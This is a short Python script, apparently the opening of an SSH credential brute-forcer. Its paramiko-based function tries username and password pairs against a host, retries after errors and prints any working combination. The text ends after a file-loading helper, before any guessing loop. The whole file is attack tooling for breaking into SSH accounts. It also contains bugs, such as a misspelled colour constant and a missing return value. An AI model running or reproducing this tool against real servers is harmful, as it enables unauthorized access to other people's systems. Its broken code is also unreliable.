import paramiko
import socket
import time
from colorama import init, Fore
import itertools
import string
import argparse 
from threading import Thread
import queue
import sys


init()

GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESEST
RED = Fore.RED

q = queue.Queue()

def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password)
    except socket.timeout:
        print(f"{RED}[-] Host: {hostname} is unreachable. Time out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[-] Invalid credentials fro {username}:{password}")
    except paramiko.SSHException:
        print(f"{BLUE} [*] Retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f"{GREEN} Found combo: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True

def load_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return lines